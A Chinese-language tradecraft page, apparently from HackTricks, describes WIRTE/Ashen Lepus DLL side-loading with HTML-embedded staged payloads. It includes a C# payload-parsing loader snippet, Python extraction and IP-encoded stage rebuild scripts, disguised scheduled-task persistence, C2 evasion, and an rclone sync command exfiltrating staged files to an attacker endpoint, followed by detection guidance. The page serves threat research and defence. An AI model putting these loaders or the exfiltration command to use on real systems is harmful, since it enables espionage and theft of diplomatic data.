# 使用 HTML 嵌入式 Payload 分阶段投递的高级 DLL Side-Loading

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft 概述

Ashen Lepus（又称 WIRTE）将 DLL sideloading、分阶段投递的 HTML payload 和模块化 .NET 后门串联成一套可重复使用的模式，在中东外交网络中实现持久化。任何操作者都可以复用这项技术，因为它依赖于：<sup>[[1]](#references)</sup>

- **基于归档文件的社会工程**：良性 PDF 指引目标从文件共享网站下载 RAR 归档文件。归档中包含一个看似真实的文档查看器 EXE、一个使用可信库名称命名的恶意 DLL（例如 `netutils.dll`、`srvcli.dll`、`dwampi.dll`、`wtsapi32.dll`），以及一个诱饵 `Document.pdf`。
- **滥用 DLL 搜索顺序**：受害者双击 EXE 后，Windows 会从当前目录解析 DLL 导入项，恶意加载器（AshenLoader）便在可信进程中执行，同时打开诱饵 PDF 以避免引起怀疑。
- **利用系统自带工具进行分阶段投递**：所有后续阶段（AshenStager → AshenOrchestrator → 模块）都会在需要之前留在磁盘之外，并以加密 blob 的形式隐藏在看似无害的 HTML 响应中进行传递。

## 多阶段 Side-Loading 链

1. **诱饵 EXE → AshenLoader**：EXE 通过 side-load 加载 AshenLoader，后者执行主机侦察，使用 AES-CTR 加密侦察结果，并将其 POST 到 API 风格的路径（例如 `/api/v2/account`）中轮换使用的参数内，如 `token=`、`id=`、`q=` 或 `auth=`。<sup>[[1]](#references)</sup>
2. **HTML 提取**：只有当客户端 IP 的地理位置属于目标地区，且 `User-Agent` 与 implant 匹配时，C2 才会泄露下一阶段，从而挫败 sandbox。检查通过后，HTTP 正文中会包含 `<headerp>...</headerp>` blob，其中是 Base64/AES-CTR 加密的 AshenStager payload。
3. **第二次 side-load**：AshenStager 与另一个导入 `wtsapi32.dll` 的合法二进制文件一起部署。注入该二进制文件的恶意副本会获取更多 HTML，这次通过提取 `<article>...</article>` 来恢复 AshenOrchestrator。
4. **AshenOrchestrator**：一个模块化 .NET 控制器，用于解码 Base64 JSON 配置。配置中的 `tg` 和 `au` 字段会拼接并哈希为 AES 密钥，用于解密 `xrk`。解密后的字节将作为 XOR 密钥，用于之后获取的每个模块 blob。
5. **模块投递**：每个模块都通过 HTML 注释进行描述，由注释将解析器重定向到任意标签，从而绕过只检查 `<headerp>` 或 `<article>` 的静态规则。模块包括持久化（`PR*`）、卸载程序（`UN*`）、侦察（`SN`）、屏幕捕获（`SCT`）和文件浏览（`FE`）。

### HTML 容器解析模式

```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```

即使防御方屏蔽或剥除特定元素，操作者只需更改 HTML 注释中提示的标签，即可恢复投递。<sup>[[1]](#references)</sup>

### 快速提取辅助工具（Python）

```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```

## HTML Staging Evasion 的相似之处

近期关于 HTML smuggling 的研究（Talos）指出，payload 会以 Base64 字符串的形式隐藏在 HTML 附件的 `<script>` 块中，并在运行时通过 JavaScript 解码。<sup>[[2]](#references)</sup> 同样的技巧也可用于 C2 响应：将加密 blob 放在 script 标签（或其他 DOM 元素）中，并在内存中解码后再进行 AES/XOR 处理，使页面看起来像普通 HTML。Talos 还展示了 script 标签中的分层混淆（标识符重命名加上 Base64/Caesar/AES），这很容易映射到 HTML-staged C2 blob。<sup>[[2]](#references)</sup> Talos 后来关于 **hidden text salting** 的文章也与此相关：只需用无关的 HTML 注释或空白拆分 Base64，就足以绕过简单的 regex 提取器，同时让浏览器端重组依然简单。<sup>[[7]](#references)</sup>

## 近期变种说明（2024-2025）

- Check Point 发现，WIRTE 在 2024 年发起的活动仍以基于 archive 的 sideloading 为核心，但第一阶段使用了 `propsys.dll`（stagerx64）。该 stager 使用 Base64 + XOR（密钥 `53`）解码下一个 payload，发送带有硬编码 `User-Agent` 的 HTTP 请求，并提取嵌入在 HTML 标签之间的加密 blob。在一个分支中，stage 由一长串嵌入的 IP 字符串重建，这些字符串通过 `RtlIpv4StringToAddressA` 解码，然后拼接成 payload 字节。<sup>[[3]](#references)</sup>
- OWN-CERT 记录了更早期的 WIRTE 工具，其中 sideloaded 的 `wtsapi32.dll` dropper 使用 Base64 + TEA 保护字符串，并将 DLL 名称本身用作解密密钥；随后，它对主机识别数据进行 XOR/Base64 混淆，再发送到 C2。<sup>[[4]](#references)</sup>

## 重建 IP 编码的 Stages

WIRTE 在 2024 年的 `propsys.dll` 分支表明，下一个 PE 不必以一个连续的 HTML blob 存放。loader 可以将 stage 字节保存为点分四组字符串，再通过 `RtlIpv4StringToAddressA` 重建，这种模式与 Hive 的 **IPfuscation** 技术密切相关。<sup>[[3]](#references)[[5]](#references)</sup> 从操作角度看，当攻击者希望 HTML 页面包含看似无害的 IOCs 或配置数据，而不是明显的 Base64 payload 时，这种方式很有用。

```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```

如果恢复出的字节以 `MZ` 开头，你很可能直接重建出了下一个 PE。如果不是，请检查是否存在前置 XOR/Base64 层，或地址之间是否有小型分隔符块。

## 可替换的 DLL 名称与主机轮换

此模式的一项显著优势是，**HTML/AES/XOR staging 后端可以保持不变，只需更换 sideload 配对**。WIRTE 在不同活动中轮换使用了 `netutils.dll`、`srvcli.dll`、`dwampi.dll`、`wtsapi32.dll` 和 `propsys.dll`，这很有用，因为：<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` 和 `wtsapi32.dll` 是不起眼的 Windows DLL 名称，防御者会预期它们存在于 `%System32%` / `%SysWOW64%` 中。
- **HijackLibs** 等公开目录已经映射了许多会从复制后的应用程序目录加载这些 DLL 名称的二进制文件，因此操作人员可以替换宿主，而无需重新设计 stager。
- 只需针对每个宿主调整导出接口。HTML parser、AES/XOR routines 和 module loader 通常可以原样移植到 forwarding proxy DLL 中。

对于 offensive lab 工作，这意味着你可以把问题拆分为 **(1) 找到一个稳定的已签名宿主，使其从本地解析你选定的 DLL 名称；以及 (2) 在该 DLL 后复用相同的 staged-HTML loader 逻辑**。

## 加密与 C2 加固

- **全程使用 AES-CTR**：当前的 loader 会嵌入 256-bit 密钥和 nonce（例如 `{9a 20 51 98 ...}`），并可选择在解密前后使用诸如 `msasn1.dll` 的字符串再加一层 XOR。<sup>[[1]](#references)</sup>
- **密钥材料变化**：早期 loader 使用 Base64 + TEA 保护嵌入的字符串，解密密钥则从恶意 DLL 名称（例如 `wtsapi32.dll`）派生。<sup>[[4]](#references)</sup>
- **基础设施拆分 + 子域伪装**：staging 服务器按工具分开，托管于不同的 ASN，有时还会使用看似合法的子域作为前置，因此一个 staging 节点被暴露不会牵连其他节点。
- **侦察数据走私**：枚举数据现在包含 Program Files 列表，用于发现高价值应用，并且在离开主机前始终会加密。
- **URI 轮换**：查询参数和 REST 路径会在不同活动中轮换（`/api/v1/account?token=` → `/api/v2/account?auth=`），使脆弱的检测规则失效。
- **固定 User-Agent + 安全重定向**：C2 基础设施仅响应完全匹配的 UA 字符串，否则会重定向到看似无害的新闻/健康网站，以融入正常流量。
- **门控投递**：服务器设置地理围栏，并且只响应真实 implant。未获批准的客户端会收到看似无害的 HTML。

## 持久化与执行循环

AshenStager 会创建伪装成 Windows 维护任务的 scheduled tasks，并通过 `svchost.exe` 执行，例如：<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

这些任务会在启动时或定期重新启动 sideloading chain，确保 AshenOrchestrator 能请求新的模块，而无需再次触碰磁盘。

## 使用良性同步客户端进行数据外传

操作人员会通过专用模块将外交文件暂存到 `C:\Users\Public`（所有用户均可读取，且不显可疑），然后下载合法的 [Rclone](https://rclone.org/) 二进制文件，将该目录同步到攻击者的存储位置。Unit42 指出，这是首次观察到该行为者使用 Rclone 进行数据外传，这也符合滥用合法同步工具以融入正常流量的整体趋势：<sup>[[1]](#references)</sup>

1. **暂存**：将目标文件复制/收集到 `C:\Users\Public\{campaign}\`。
2. **配置**：提供一个 Rclone 配置文件，指向攻击者控制的 HTTPS 端点（例如 `api.technology-system[.]com`）。
3. **同步**：运行 `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet`，使流量看起来像正常的云备份。

由于 Rclone 广泛用于合法的备份工作流程，防御者必须重点关注异常执行（新出现的二进制文件、可疑的远程端点，或突然同步 `C:\Users\Public`）。

## 检测切入点

- 对意外从用户可写路径加载 DLL 的**已签名进程**发出告警（使用 Procmon filters + `Get-ProcessMitigation -Module`），尤其是 DLL 名称与 `netutils`、`srvcli`、`dwampi`、`wtsapi32` 或 `propsys` 重合时。<sup>[[6]](#references)</sup>
- 检查可疑 HTTPS 响应中是否有**嵌入在异常标签中的大型 Base64 blob**，或是否由 `<!-- TAG: <xyz> -->` 注释保护。
- 先规范化 HTML：**提取 Base64 前先移除注释并合并空白字符**，因为 hidden-text-salting 风格的规避手法可能会将 payload 拆分到多个注释边界之间。
- 将 HTML 搜索范围扩展到 **`<script>` 块中的 Base64 字符串**（类似 HTML smuggling 的 staging），这些字符串会先由 JavaScript 解码，再进行 AES/XOR 处理。
- 搜索 **`RtlIpv4StringToAddressA` 后接缓冲区组装操作**的重复调用，尤其是周围字符串为较长 IPv4 列表，而非真实网络目标时。
- 搜索以非服务参数运行 `svchost.exe` 或指向 dropper 目录的 **scheduled tasks**。
- 追踪 **C2 重定向**：它们只会为完全匹配的 `User-Agent` 字符串返回 payload，否则会跳转到合法的新闻/健康域名。
- 监控 **Rclone** 二进制文件是否出现在 IT 管理位置之外、是否出现新的 `rclone.conf` 文件，或是否有同步任务从 `C:\Users\Public` 等 staging 目录提取数据。

## References

- [1] [与哈马斯有关联的 Ashen Lepus 使用全新 AshTag 恶意软件套件攻击中东外交机构](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [隐藏在标签之间：HTML smuggling 规避技术解析](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [与哈马斯有关联的威胁行为者 WIRTE 继续在中东开展行动，并转向破坏性活动](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE：寻找逝去的时间](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware 部署新型 IPfuscation 技术以规避检测](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [可能从非系统位置进行 System DLL Sideloading](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [为电子邮件威胁添加隐藏文本填充](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)
{{#include ../../../banners/hacktricks-training.md}}
